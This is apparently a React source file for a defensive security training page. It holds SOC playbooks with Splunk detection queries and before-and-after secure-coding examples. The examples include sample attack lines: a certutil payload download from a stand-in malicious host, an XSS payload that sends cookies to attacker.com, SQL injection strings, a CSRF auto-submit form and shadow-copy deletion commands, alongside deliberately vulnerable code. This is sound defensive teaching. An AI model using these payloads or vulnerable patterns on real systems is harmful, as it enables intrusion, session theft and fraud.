import { useState } from "react";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { Button } from "@/components/ui/button";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert";
import {
    Shield,
    AlertTriangle,
    Target,
    Eye,
    FileSearch,
    Activity,
    Lock,
    CheckCircle2,
    XCircle,
    Clock,
    Users,
    Database,
    Network,
    Code,
    Search,
    BarChart3,
    Bell,
    BookOpen,
    Zap,
    ArrowRight
} from "lucide-react";

interface SOCPlaybook {
    id: string;
    title: string;
    severity: "Critical" | "High" | "Medium" | "Low";
    category: "Incident Response" | "Alert Triage" | "Threat Hunting" | "SIEM";
    description: string;
    alertTypes: string[];
    investigationSteps: string[];
    tools: string[];
    siemQuery?: string;
    falsePositiveChecks: string[];
    escalationCriteria: string[];
    containmentActions: string[];
}

const socPlaybooks: SOCPlaybook[] = [
    {
        id: "ir-01",
        title: "SQL Injection Breach Response",
        severity: "Critical",
        category: "Incident Response",
        description: "Active SQL injection attack detected with evidence of data exfiltration",
        alertTypes: [
            "WAF: Multiple SQL injection patterns blocked",
            "Database: Unusual SELECT queries on sensitive tables",
            "Database: INFORMATION_SCHEMA access attempts",
            "Network: Large outbound data transfers"
        ],
        investigationSteps: [
            "1. Verify Alert Legitimacy: Check WAF logs for actual SQL payloads (not false positives from user behavior)",
            "2. Identify Affected Systems: Which web application? Which database? User accounts compromised?",
            "3. Check for Successful Exploitation: Review database logs for: Successful queries with UNION/OR patterns, Access to user tables, Data modifications or deletions",
            "4. Assess Blast Radius: How many records accessed? Was PII/PHI exposed? Any administrative tables queried?",
            "5. Timeline Analysis: When did attack start? Duration? Is it still active?",
            "6. Attacker Attribution: Source IP, User-Agent, Geolocation, Check threat intel feeds (AbuseIPDB, VirusTotal)"
        ],
        tools: [
            "Splunk/ELK (Log analysis)",
            "WAF Dashboard (Palo Alto, Cloudflare, AWS WAF)",
            "Database Audit Logs (MySQL logs, PostgreSQL logs)",
            "Wireshark (Packet capture if needed)",
            "ThreatConnect/MISP (Threat intelligence)"
        ],
        siemQuery: `index=web_access status=200
| regex body="(UNION|SELECT|'\\s+OR\\s+'|--)"
| stats count by src_ip, uri, body
| where count > 5
| table _time, src_ip, uri, body, count`,
        falsePositiveChecks: [
            "Is this a security scanner from your own team? (Check IP against known scanner list)",
            "Is this a developer testing in staging environment?",
            "Are these legitimate database queries from admin tools?",
            "Check if WAF is too sensitive (blocking normal search queries)"
        ],
        escalationCriteria: [
            "Evidence of successful data exfiltration (SELECT queries with UNION)",
            "Access to customer PII, credit cards, or PHI",
            "Administrative account compromise",
            "Data modification/deletion detected (UPDATE, DROP queries)",
            "Attack ongoing for > 30 minutes without containment"
        ],
        containmentActions: [
            "IMMEDIATE (0-5 min): Enable aggressive WAF blocking for SQL patterns, Rate-limit attacker IP to 1 request/min",
            "SHORT-TERM (5-30 min): Block attacker IP at firewall level, If user account compromised: Force logout all sessions, Reset password, Disable account temporarily",
            "MEDIUM-TERM (30min-2hr): Deploy emergency patch: Use parameterized queries/prepared statements, Add input validation on affected endpoints, Enable database query logging (if not already on)",
            "LONG-TERM (2hr+): Code review of entire application for SQLi vulnerabilities, Penetration test after fixes deployed, Implement database activity monitoring (DAM), Consider database encryption at rest"
        ]
    },
    {
        id: "triage-01",
        title: "Brute Force Alert Triage (SSH/RDP/Web Login)",
        severity: "Medium",
        category: "Alert Triage",
        description: "Multiple failed login attempts detected - determine if this is noise or threat",
        alertTypes: [
            "IDS: Multiple failed SSH authentication attempts",
            "Windows Event: Multiple failed RDP logons (Event ID 4625)",
            "Web Application: Multiple failed login attempts (HTTP 401)",
            "Firewall: High connection volume to port 22/3389/443"
        ],
        investigationSteps: [
            "1. Baseline Check: Is this volume normal for this asset? (Compare to 7-day average)",
            "2. Success vs Failure Ratio: 10,000 failed attempts = noise, 1 successful attempt = breach",
            "3. Account Analysis: Random usernames (scanning) vs real accounts (targeted)?",
            "4. Source Analysis: Single IP (amateur) vs distributed IPs (botnet)?",
            "5. Timing Analysis: Burst (automated tool) vs distributed over time (manual)?",
            "6. Geo-Anomaly: Logins from countries you don't operate in?",
            "7. Successful Login Investigation (if any): Time of successful login, Account that succeeded, Actions taken post-login, Lateral movement attempts?"
        ],
        tools: [
            "SIEM (Splunk, ELK, QRadar)",
            "Windows Event Viewer (Security logs)",
            "Linux auth.log (/var/log/auth.log)",
            "GreyNoise/AbuseIPDB (IP reputation)",
            "MaxMind GeoIP (Geolocation)"
        ],
        siemQuery: `index=linux sourcetype=linux_secure "Failed password"
| stats count, values(user) as attempted_users by src_ip
| where count > 50
| eval severity=case(count>1000,"Critical",count>500,"High",count>100,"Medium",1=1,"Low")
| table _time, src_ip, attempted_users, count, severity`,
        falsePositiveChecks: [
            "User forgot password (legitimate attempts from known IP/device)",
            "Service account misconfiguration (application using wrong credentials)",
            "Automated monitoring tools (Nagios, Zabbix trying to connect)",
            "VPN users with saved incorrect credentials",
            "Time zone confusion (user trying to login during \"impossible travel\" hours)"
        ],
        escalationCriteria: [
            "ANY successful login from suspicious IP",
            "Attempts using admin/root/administrator accounts",
            "Brute force against domain controller or privileged servers",
            "Successful login followed by unusual activity (new processes, file access)",
            "Credential stuffing (trying leaked passwords, not random)"
        ],
        containmentActions: [
            "NO ESCALATION NEEDED (Noise): Failed attempts only, random usernames, known scanner IPs → Document and close",
            "MEDIUM PRIORITY: Block source IPs at firewall, Enable CAPTCHA/MFA for web logins, Implement account lockout (5 failures = 15min lockout)",
            "CRITICAL (Successful login): Immediately terminate active sessions, Force password reset on compromised accounts, Check for: Lateral movement, Privilege escalation, Data access, New user accounts created, Scheduled tasks/cron jobs added, Remote access tools installed (TeamViewer, AnyDesk)"
        ]
    },
    {
        id: "hunting-01",
        title: "Threat Hunting: Detect Living off the Land (LOLBins)",
        severity: "High",
        category: "Threat Hunting",
        description: "Proactively hunt for attackers using legitimate Windows tools for malicious purposes",
        alertTypes: [
            "Hypothesis: Attackers use PowerShell, WMI, or certutil for command execution and lateral movement",
            "IOCs: Suspicious PowerShell commands with -EncodedCommand, WMI process creation, certutil downloading files"
        ],
        investigationSteps: [
            "1. PowerShell Hunting: Search for: Base64 encoded commands (-EncodedCommand, -Enc), Download commands (Invoke-WebRequest, IEX, DownloadString), Obfuscation (mixed case, backticks), Remote execution (Invoke-Command targeting other machines)",
            "2. WMI Hunting: WMI process creation on remote systems, WMI persistence (event subscriptions), WMI used for lateral movement",
            "3. Certutil.exe Hunting: Used to download files (certutil -urlcache -f http://malicious.com/payload.exe), Used to decode Base64 payloads",
            "4. Other LOLBins: Rundll32.exe (executing DLLs), Regsvr32.exe (script execution), Mshta.exe (running HTA files), BitsAdmin (file transfers)",
            "5. Correlation: Are these tools running from unusual users, at unusual times, or with unusual parent processes?",
            "6. Baseline Comparison: Compare current activity to 30-day baseline (sudden spike = suspicious)"
        ],
        tools: [
            "Sysmon (Event ID 1: Process Creation, Event ID 3: Network Connection)",
            "Windows Event Logs (Event ID 4688: Process Creation)",
            "EDR (CrowdStrike, Carbon Black, Defender ATP)",
            "LOLBAS Project (https://lolbas-project.github.io/ - catalog of LOLBins)",
            "PowerShell Script Block Logging (Event ID 4104)"
        ],
        siemQuery: `index=windows EventCode=1 (Image="*powershell.exe" OR Image="*wmic.exe" OR Image="*certutil.exe" OR Image="*rundll32.exe")
| eval suspicious_powershell=if(like(CommandLine,"%EncodedCommand%") OR like(CommandLine,"%IEX%") OR like(CommandLine,"%DownloadString%"), 1, 0)
| eval suspicious_certutil=if(like(CommandLine,"%urlcache%") OR like(CommandLine,"%-decode%"), 1, 0)
| eval suspicious_wmi=if(like(CommandLine,"%process call create%"), 1, 0)
| where suspicious_powershell=1 OR suspicious_certutil=1 OR suspicious_wmi=1
| stats count by Computer, User, Image, CommandLine
| table _time, Computer, User, Image, CommandLine, count`,
        falsePositiveChecks: [
            "IT administrators using PowerShell for legitimate scripting (check known admin accounts)",
            "Automated patch management systems using WMI",
            "Developers testing scripts in dev environments",
            "Antivirus software updates using certutil (some AVs do this)",
            "System administrators running remote commands via WMI/PSRemoting"
        ],
        escalationCriteria: [
            "PowerShell with -EncodedCommand from non-admin user",
            "Certutil downloading .exe files from internet",
            "WMI process creation targeting Domain Controllers",
            "LOLBins running from temp directories or user profile folders",
            "Lateral movement detected (same tool used on multiple systems)",
            "Execution during off-hours (2am-5am when no IT staff present)"
        ],
        containmentActions: [
            "INVESTIGATION PHASE: Isolate suspicious hosts from network (EDR network containment), Collect memory dump for forensic analysis, Preserve logs (export to forensic server)",
            "IF MALICIOUS CONFIRMED: Kill malicious processes, Remove persistence mechanisms (scheduled tasks, registry run keys), Hunt for additional compromised systems (check other hosts for same IOCs), Reset credentials for affected accounts",
            "HARDENING: Enable PowerShell Constrained Language Mode (CLM), Block certutil.exe via AppLocker/WDAC, Enable PowerShell script block logging on all systems, Monitor for script block obfuscation (Event ID 4104 with warnings)"
        ]
    },
    {
        id: "siem-01",
        title: "SIEM Detection: Ransomware Early Warning Signs",
        severity: "Critical",
        category: "SIEM",
        description: "Build SIEM rules to detect ransomware before encryption completes",
        alertTypes: [
            "High volume of file modifications in short time window",
            "Mass file extension changes (.docx → .encrypted, .locked, .crypted)",
            "Suspicious processes accessing many files (e.g., unknown .exe touching 100+ files/min)",
            "Backup deletion or Volume Shadow Copy deletion (vssadmin delete shadows)"
        ],
        investigationSteps: [
            "1. File Activity Baseline: What's normal file churn? (Compare current vs 7-day average)",
            "2. Extension Analysis: Are files changing extensions in bulk? (.doc → .crypted)",
            "3. Process Analysis: Which process is modifying files? Legitimate (Word.exe) or suspicious (random.exe)?",
            "4. User Analysis: Which user account? Admin? Service account? Compromised user?",
            "5. Network Activity: Is the host beaconing to C2? (Check for DNS/HTTP requests to unknown domains)",
            "6. Volume Shadow Copy Check: Are backups being deleted? (Major red flag)",
            "7. Speed Assessment: How many files encrypted so far? Projected time to complete encryption?",
            "8. Blast Radius: Is it spreading? (Check network file shares, other hosts)"
        ],
        tools: [
            "SIEM (Splunk, ELK, QRadar)",
            "File Integrity Monitoring (Tripwire, OSSEC)",
            "EDR (CrowdStrike, Carbon Black)",
            "Sysmon (Event ID 11: File Creation)",
            "Windows Event Logs (Event ID 4663: File Access)",
            "Network monitoring (Wireshark, Zeek)"
        ],
        siemQuery: `index=windows EventCode=11 
| stats dc(TargetFilename) as unique_files by Computer, User, Image 
| where unique_files > 100 
| eval alert_severity=case(unique_files>1000,"Critical",unique_files>500,"High",1=1,"Medium")
| table _time, Computer, User, Image, unique_files, alert_severity

# Detect Volume Shadow Copy deletion
index=windows (EventCode=1 AND CommandLine="*vssadmin*delete*shadows*") OR (EventCode=1 AND CommandLine="*wmic*shadowcopy*delete*")
| table _time, Computer, User, CommandLine`,
        falsePositiveChecks: [
            "Legitimate bulk file operations (video editing, large file transfers, backups)",
            "Software updates modifying many files (Windows Update, application updates)",
            "Anti-virus full system scans (touching many files)",
            "Developers compiling large projects (many .obj, .dll files created)",
            "Database maintenance operations (backup/restore)"
        ],
        escalationCriteria: [
            "ANY Volume Shadow Copy deletion command",
            "File extension changes to known ransomware extensions (.crypted, .locked, .encrypted, .cerber, .locky)",
            "Process name matches known ransomware (check threat intel feeds)",
            "Ransom note files created (READ_ME.txt, HOW_TO_DECRYPT.html)",
            "Network beaconing to known ransomware C2 infrastructure",
            "Encryption activity detected on file servers or domain controllers"
        ],
        containmentActions: [
            "IMMEDIATE (0-60 seconds): Network isolation - disconnect host from network (pull ethernet, disable WiFi via EDR), Kill suspicious processes via EDR, Alert entire IR team (Severity 1 incident)",
            "SHORT-TERM (1-5 min): Identify patient zero (which system was first infected?), Check file shares (disconnect network shares to prevent spread), Snapshot/image the infected system (forensics), Restore from backups if encryption confirmed",
            "MEDIUM-TERM (5-30 min): Hunt for lateral movement (check other systems for same process name/hash), Reset credentials (attacker may have dumped passwords), Check for persistence mechanisms (scheduled tasks, registry run keys), Identify attack vector: Phishing email? RDP brute force? Exploit?",
            "LONG-TERM: Deploy emergency patches if exploit-based, Implement network segmentation (prevent future lateral movement), Enable Controlled Folder Access (Windows Defender), Backup verification (are backups offline and immutable?), Post-mortem and lessons learned"
        ]
    }
];

interface SecureCodeExample {
    id: string;
    vulnerability: string;
    language: string;
    badCode: string;
    badExplanation: string;
    goodCode: string;
    goodExplanation: string;
    references: string[];
}

const secureCodeExamples: SecureCodeExample[] = [
    {
        id: "sql-01",
        vulnerability: "SQL Injection",
        language: "Python (Flask + SQLAlchemy)",
        badCode: `# ❌ VULNERABLE CODE
@app.route('/user/<username>')
def get_user(username):
    query = f"SELECT * FROM users WHERE username = '{username}'"
    result = db.engine.execute(query)
    return render_template('user.html', user=result)

# Attacker payload: /user/admin'--
# Results in: SELECT * FROM users WHERE username = 'admin'--'
# Comment (--) ignores the rest, bypassing authentication`,
        badExplanation: "String concatenation creates SQL injection vulnerability. Attacker can inject ' OR '1'='1 to dump all users, or use UNION to extract data from other tables.",
        goodCode: `# ✅ SECURE CODE
from sqlalchemy import text

@app.route('/user/<username>')
def get_user(username):
    # Method 1: Parameterized query (preferred)
    query = text("SELECT * FROM users WHERE username = :username")
    result = db.engine.execute(query, {"username": username})
    return render_template('user.html', user=result)
    
    # Method 2: ORM (even better)
    user = User.query.filter_by(username=username).first()
    return render_template('user.html', user=user)`,
        goodExplanation: "Parameterized queries treat user input as data, not code. The database driver automatically escapes special characters. ORM (Object-Relational Mapping) is even safer as it abstracts SQL entirely.",
        references: [
            "OWASP SQL Injection Prevention Cheat Sheet",
            "SQLAlchemy Documentation: Using Textual SQL",
            "CWE-89: Improper Neutralization of Special Elements used in an SQL Command"
        ]
    },
    {
        id: "xss-01",
        vulnerability: "Cross-Site Scripting (XSS)",
        language: "JavaScript (React)",
        badCode: `// ❌ VULNERABLE CODE
function UserComment({ comment }) {
  // Directly rendering user input as HTML
  return (
    <div dangerouslySetInnerHTML={{ __html: comment.text }} />
  );
}

// Attacker comment: <script>fetch('https://attacker.com?cookie='+document.cookie)</script>
// Result: Cookie theft, session hijacking`,
        badExplanation: "dangerouslySetInnerHTML renders raw HTML without sanitization. Attacker can inject <script> tags to steal cookies, modify page content, or perform actions as the victim.",
        goodCode: `// ✅ SECURE CODE
import DOMPurify from 'dompurify';

function UserComment({ comment }) {
  // Method 1: Use React's default escaping (safest for plain text)
  return (
    <div>{comment.text}</div>
  );
  
  // Method 2: If HTML is required, sanitize with DOMPurify
  const sanitizedHTML = DOMPurify.sanitize(comment.text, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],
    ALLOWED_ATTR: ['href']
  });
  return (
    <div dangerouslySetInnerHTML={{ __html: sanitizedHTML }} />
  );
}`,
        goodExplanation: "React automatically escapes text content when using {variable}. If HTML rendering is required (rich text), use DOMPurify with a whitelist of allowed tags. Never trust user input.",
        references: [
            "OWASP XSS Prevention Cheat Sheet",
            "React Security Best Practices",
            "DOMPurify: https://github.com/cure53/DOMPurify"
        ]
    },
    {
        id: "auth-01",
        vulnerability: "Insecure Password Storage",
        language: "Node.js (Express + bcrypt)",
        badCode: `// ❌ VULNERABLE CODE
const crypto = require('crypto');

// Plain text storage
app.post('/register', async (req, res) => {
  const { username, password } = req.body;
  await db.users.insert({ username, password }); // Stored as plain text!
  res.json({ success: true });
});

// MD5 hashing (broken)
app.post('/register-v2', async (req, res) => {
  const { username, password } = req.body;
  const hash = crypto.createHash('md5').update(password).digest('hex');
  await db.users.insert({ username, password: hash }); // Still vulnerable!
  res.json({ success: true });
});

// Why MD5 fails:
// 1. No salt (same password = same hash, vulnerable to rainbow tables)
// 2. Too fast (GPUs can try billions of MD5 hashes/second)
// 3. Collisions (two inputs can produce same hash)`,
        badExplanation: "Plain text storage means database breach = immediate credential compromise. MD5 is too fast and unsalted, enabling rainbow table attacks. Attackers can crack millions of MD5 hashes per second.",
        goodCode: `// ✅ SECURE CODE
const bcrypt = require('bcrypt');
const SALT_ROUNDS = 12; // Computational cost (2^12 iterations)

app.post('/register', async (req, res) => {
  const { username, password } = req.body;
  
  // Input validation
  if (password.length < 12) {
    return res.status(400).json({ error: 'Password must be 12+ characters' });
  }
  
  // Hash with bcrypt (automatic salting)
  const hashedPassword = await bcrypt.hash(password, SALT_ROUNDS);
  
  // Store hash (not plain password)
  await db.users.insert({ username, password: hashedPassword });
  
  res.json({ success: true });
});

// Login verification
app.post('/login', async (req, res) => {
  const { username, password } = req.body;
  const user = await db.users.findOne({ username });
  
  if (!user) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }
  
  // Compare with bcrypt (time-constant comparison)
  const isValid = await bcrypt.compare(password, user.password);
  
  if (!isValid) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }
  
  // Generate session token (JWT, session ID, etc.)
  const token = generateSessionToken(user);
  res.json({ token });
});`,
        goodExplanation: "Bcrypt: Salted (unique hash per password), Slow by design (prevents brute force), Adaptive (increase SALT_ROUNDS as hardware improves). Alternative: Argon2 (winner of Password Hashing Competition). Never use MD5, SHA1, or plain SHA256 for passwords.",
        references: [
            "OWASP Password Storage Cheat Sheet",
            "bcrypt NPM package: https://www.npmjs.com/package/bcrypt",
            "Argon2: https://github.com/ranisalt/node-argon2"
        ]
    },
    {
        id: "idor-01",
        vulnerability: "Insecure Direct Object Reference (IDOR)",
        language: "Ruby on Rails",
        badCode: `# ❌ VULNERABLE CODE
class DocumentsController < ApplicationController
  def show
    # Directly using user-supplied ID without authorization check
    @document = Document.find(params[:id])
    render json: @document
  end
end

# Attacker can enumerate: /documents/1, /documents/2, /documents/3
# Accesses ANY document, not just their own`,
        badExplanation: "No authorization check. If attacker knows document IDs (sequential: 1, 2, 3...), they can access any document. Common in APIs. Cost: Data breach, privacy violations, compliance fines (GDPR, HIPAA).",
        goodCode: `# ✅ SECURE CODE
class DocumentsController < ApplicationController
  before_action :authenticate_user!
  
  def show
    # Method 1: Scope queries to current user (preferred)
    @document = current_user.documents.find(params[:id])
    render json: @document
  rescue ActiveRecord::RecordNotFound
    # Don't reveal if document exists (information disclosure)
    render json: { error: 'Not found' }, status: :not_found
  end
  
  # Method 2: Explicit authorization check
  def show_v2
    @document = Document.find(params[:id])
    
    # Use authorization library (Pundit, CanCanCan)
    authorize @document, :show?
    
    render json: @document
  rescue Pundit::NotAuthorizedError
    render json: { error: 'Not authorized' }, status: :forbidden
  end
end

# Pundit policy example
class DocumentPolicy < ApplicationPolicy
  def show?
    # User can only view their own documents, or admin can view all
    user.admin? || record.user_id == user.id
  end
end`,
        goodExplanation: "Always scope queries to current_user. Use authorization frameworks (Pundit, CanCanCan). Don't expose internal IDs - use UUIDs instead of sequential integers. Generic error messages prevent information disclosure.",
        references: [
            "OWASP Broken Access Control",
            "Pundit gem: https://github.com/varvet/pundit",
            "Rails Security Guide: Authorization"
        ]
    },
    {
        id: "csrf-01",
        vulnerability: "Cross-Site Request Forgery (CSRF)",
        language: "PHP",
        badCode: `<?php
// ❌ VULNERABLE CODE
session_start();

// No CSRF token validation
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $amount = $_POST['amount'];
    $to_account = $_POST['to_account'];
    
    // Transfer money without verifying request origin
    transfer_money($_SESSION['user_id'], $to_account, $amount);
    echo "Transfer successful!";
}
?>

<!-- Attacker's malicious page -->
<form action="https://bank.com/transfer.php" method="POST" id="attack">
  <input type="hidden" name="amount" value="10000">
  <input type="hidden" name="to_account" value="attacker_account">
</form>
<script>document.getElementById('attack').submit();</script>

<!-- Victim visits attacker page while logged into bank → money stolen -->`,
        badExplanation: "No CSRF protection. Attacker can create a malicious page that submits forms to bank.com. If victim is authenticated, browser automatically sends session cookie. Result: Unauthorized money transfer.",
        goodCode: `<?php
// ✅ SECURE CODE
session_start();

// Generate CSRF token (do this on login or page load)
if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Verify CSRF token
    if (!isset($_POST['csrf_token']) || 
        !hash_equals($_SESSION['csrf_token'], $_POST['csrf_token'])) {
        die('Invalid CSRF token');
    }
    
    $amount = $_POST['amount'];
    $to_account = $_POST['to_account'];
    
    transfer_money($_SESSION['user_id'], $to_account, $amount);
    
    // Regenerate token after use (one-time token)
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
    
    echo "Transfer successful!";
}
?>

<!-- Include CSRF token in form -->
<form action="/transfer.php" method="POST">
  <input type="hidden" name="csrf_token" value="<?= htmlspecialchars($_SESSION['csrf_token']) ?>">
  <input type="text" name="amount" placeholder="Amount">
  <input type="text" name="to_account" placeholder="To Account">
  <button type="submit">Transfer</button>
</form>`,
        goodExplanation: "CSRF token: Unique per session, Unpredictable (cryptographically random), Verified server-side, Regenerated after use. Alternative: SameSite cookie attribute (modern browsers). For APIs: Use Authorization header instead of cookies.",
        references: [
            "OWASP CSRF Prevention Cheat Sheet",
            "SameSite Cookie Attribute: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite",
            "CSRF in APIs: Use JWT tokens, not cookies"
        ]
    }
];

const BlueTeam = () => {
    const [selectedPlaybookId, setSelectedPlaybookId] = useState<string | null>(null);
    const [selectedCodeExampleId, setSelectedCodeExampleId] = useState<string | null>(null);

    const getSeverityColor = (severity: string) => {
        switch (severity) {
            case "Critical":
                return "bg-red-100 text-red-800 border-red-200 dark:bg-red-950 dark:text-red-200";
            case "High":
                return "bg-orange-100 text-orange-800 border-orange-200 dark:bg-orange-950 dark:text-orange-200";
            case "Medium":
                return "bg-yellow-100 text-yellow-800 border-yellow-200 dark:bg-yellow-950 dark:text-yellow-200";
            case "Low":
                return "bg-blue-100 text-blue-800 border-blue-200 dark:bg-blue-950 dark:text-blue-200";
            default:
                return "bg-gray-100 text-gray-800 border-gray-200";
        }
    };

    const getCategoryIcon = (category: string) => {
        switch (category) {
            case "Incident Response": return AlertTriangle;
            case "Alert Triage": return Eye;
            case "Threat Hunting": return Search;
            case "SIEM": return BarChart3;
            default: return Shield;
        }
    };

    return (
        <div className="container mx-auto py-8 space-y-6">
            {/* Header */}
            <div>
                <div className="flex items-center gap-3 mb-2">
                    <Shield className="h-8 w-8 text-blue-600" />
                    <h1 className="text-4xl font-bold">Blue Team / SOC Operations</h1>
                </div>
                <p className="text-muted-foreground text-lg">
                    Defensive security playbooks, SIEM queries, and secure coding practices
                </p>
            </div>

            {/* Tabs */}
            <Tabs defaultValue="playbooks" className="space-y-6">
                <TabsList className="grid w-full grid-cols-2">
                    <TabsTrigger value="playbooks">
                        <Shield className="mr-2 h-4 w-4" />
                        SOC Playbooks
                    </TabsTrigger>
                    <TabsTrigger value="secure-code">
                        <Code className="mr-2 h-4 w-4" />
                        Secure Coding
                    </TabsTrigger>
                </TabsList>

                {/* SOC Playbooks Tab */}
                <TabsContent value="playbooks" className="space-y-6">
                    <Card>
                        <CardHeader>
                            <CardTitle>SOC Analyst Playbooks</CardTitle>
                            <CardDescription>
                                Step-by-step incident response and alert triage procedures
                            </CardDescription>
                        </CardHeader>
                    </Card>

                    {/* Playbooks List */}
                    <div className="grid gap-4">
                        {socPlaybooks.map((playbook) => {
                            const Icon = getCategoryIcon(playbook.category);
                            const isExpanded = selectedPlaybookId === playbook.id;

                            return (
                                <Card key={playbook.id} className="hover:shadow-lg transition-shadow">
                                    <CardHeader>
                                        <div className="flex items-start justify-between gap-4">
                                            <div className="flex-1">
                                                <div className="flex items-center gap-2 mb-2">
                                                    <Badge className={getSeverityColor(playbook.severity)}>
                                                        {playbook.severity}
                                                    </Badge>
                                                    <Badge variant="outline">
                                                        <Icon className="h-3 w-3 mr-1" />
                                                        {playbook.category}
                                                    </Badge>
                                                </div>
                                                <CardTitle className="text-xl">{playbook.title}</CardTitle>
                                                <CardDescription className="mt-2">
                                                    {playbook.description}
                                                </CardDescription>
                                            </div>
                                            <Button
                                                variant="ghost"
                                                size="sm"
                                                onClick={() => setSelectedPlaybookId(isExpanded ? null : playbook.id)}
                                            >
                                                {isExpanded ? "Hide Details" : "Show Playbook"}
                                            </Button>
                                        </div>
                                    </CardHeader>

                                    {isExpanded && (
                                        <CardContent className="space-y-6">
                                            {/* Alert Types */}
                                            <div className="space-y-3">
                                                <div className="flex items-center gap-2">
                                                    <Bell className="h-5 w-5 text-amber-600" />
                                                    <h4 className="font-semibold text-lg">Alert Indicators</h4>
                                                </div>
                                                <ul className="space-y-2">
                                                    {playbook.alertTypes.map((alert, idx) => (
                                                        <li key={idx} className="flex items-start gap-2 text-sm p-3 bg-amber-50 dark:bg-amber-950/20 rounded-lg border border-amber-200 dark:border-amber-900">
                                                            <AlertTriangle className="h-4 w-4 text-amber-600 mt-0.5 flex-shrink-0" />
                                                            <span>{alert}</span>
                                                        </li>
                                                    ))}
                                                </ul>
                                            </div>

                                            {/* Investigation Steps */}
                                            <div className="space-y-3">
                                                <div className="flex items-center gap-2">
                                                    <FileSearch className="h-5 w-5 text-blue-600" />
                                                    <h4 className="font-semibold text-lg">Investigation Steps</h4>
                                                </div>
                                                <ol className="space-y-2">
                                                    {playbook.investigationSteps.map((step, idx) => (
                                                        <li key={idx} className="flex items-start gap-3 text-sm p-3 bg-blue-50 dark:bg-blue-950/20 rounded-lg border border-blue-200 dark:border-blue-900">
                                                            <span className="flex-shrink-0 w-6 h-6 bg-blue-600 text-white rounded-full flex items-center justify-center text-xs font-bold">
                                                                {idx + 1}
                                                            </span>
                                                            <span className="whitespace-pre-line">{step}</span>
                                                        </li>
                                                    ))}
                                                </ol>
                                            </div>

                                            {/* Tools */}
                                            <div className="space-y-3">
                                                <div className="flex items-center gap-2">
                                                    <Target className="h-5 w-5 text-purple-600" />
                                                    <h4 className="font-semibold text-lg">Required Tools</h4>
                                                </div>
                                                <div className="flex flex-wrap gap-2">
                                                    {playbook.tools.map((tool, idx) => (
                                                        <Badge key={idx} variant="secondary" className="text-sm">
                                                            {tool}
                                                        </Badge>
                                                    ))}
                                                </div>
                                            </div>

                                            {/* SIEM Query */}
                                            {playbook.siemQuery && (
                                                <div className="space-y-3">
                                                    <div className="flex items-center gap-2">
                                                        <Database className="h-5 w-5 text-green-600" />
                                                        <h4 className="font-semibold text-lg">SIEM Query (Splunk)</h4>
                                                    </div>
                                                    <pre className="p-4 bg-gray-900 text-green-400 rounded-lg overflow-x-auto text-sm font-mono">
                                                        {playbook.siemQuery}
                                                    </pre>
                                                </div>
                                            )}

                                            {/* False Positive Checks */}
                                            <div className="space-y-3">
                                                <div className="flex items-center gap-2">
                                                    <CheckCircle2 className="h-5 w-5 text-green-600" />
                                                    <h4 className="font-semibold text-lg">False Positive Checks</h4>
                                                </div>
                                                <ul className="space-y-2">
                                                    {playbook.falsePositiveChecks.map((check, idx) => (
                                                        <li key={idx} className="flex items-start gap-2 text-sm p-3 bg-green-50 dark:bg-green-950/20 rounded-lg border border-green-200 dark:border-green-900">
                                                            <CheckCircle2 className="h-4 w-4 text-green-600 mt-0.5 flex-shrink-0" />
                                                            <span>{check}</span>
                                                        </li>
                                                    ))}
                                                </ul>
                                            </div>

                                            {/* Escalation Criteria */}
                                            <div className="space-y-3">
                                                <div className="flex items-center gap-2">
                                                    <Zap className="h-5 w-5 text-red-600" />
                                                    <h4 className="font-semibold text-lg">Escalation Criteria</h4>
                                                </div>
                                                <ul className="space-y-2">
                                                    {playbook.escalationCriteria.map((criteria, idx) => (
                                                        <li key={idx} className="flex items-start gap-2 text-sm p-3 bg-red-50 dark:bg-red-950/20 rounded-lg border border-red-200 dark:border-red-900">
                                                            <Zap className="h-4 w-4 text-red-600 mt-0.5 flex-shrink-0" />
                                                            <span>{criteria}</span>
                                                        </li>
                                                    ))}
                                                </ul>
                                            </div>

                                            {/* Containment Actions */}
                                            <div className="space-y-3">
                                                <div className="flex items-center gap-2">
                                                    <Lock className="h-5 w-5 text-orange-600" />
                                                    <h4 className="font-semibold text-lg">Containment & Remediation</h4>
                                                </div>
                                                <ol className="space-y-2">
                                                    {playbook.containmentActions.map((action, idx) => (
                                                        <li key={idx} className="flex items-start gap-3 text-sm p-3 bg-orange-50 dark:bg-orange-950/20 rounded-lg border border-orange-200 dark:border-orange-900">
                                                            <ArrowRight className="h-4 w-4 text-orange-600 mt-0.5 flex-shrink-0" />
                                                            <span className="whitespace-pre-line">{action}</span>
                                                        </li>
                                                    ))}
                                                </ol>
                                            </div>
                                        </CardContent>
                                    )}
                                </Card>
                            );
                        })}
                    </div>
                </TabsContent>

                {/* Secure Coding Tab */}
                <TabsContent value="secure-code" className="space-y-6">
                    <Card>
                        <CardHeader>
                            <CardTitle>Secure Coding Examples</CardTitle>
                            <CardDescription>
                                Before & after code examples showing vulnerable vs secure implementations
                            </CardDescription>
                        </CardHeader>
                    </Card>

                    {/* Code Examples List */}
                    <div className="grid gap-4">
                        {secureCodeExamples.map((example) => {
                            const isExpanded = selectedCodeExampleId === example.id;

                            return (
                                <Card key={example.id} className="hover:shadow-lg transition-shadow">
                                    <CardHeader>
                                        <div className="flex items-start justify-between gap-4">
                                            <div className="flex-1">
                                                <div className="flex items-center gap-2 mb-2">
                                                    <Badge variant="outline">
                                                        <Code className="h-3 w-3 mr-1" />
                                                        {example.language}
                                                    </Badge>
                                                </div>
                                                <CardTitle className="text-xl">{example.vulnerability}</CardTitle>
                                            </div>
                                            <Button
                                                variant="ghost"
                                                size="sm"
                                                onClick={() => setSelectedCodeExampleId(isExpanded ? null : example.id)}
                                            >
                                                {isExpanded ? "Hide Code" : "Show Example"}
                                            </Button>
                                        </div>
                                    </CardHeader>

                                    {isExpanded && (
                                        <CardContent className="space-y-6">
                                            {/* Bad Code */}
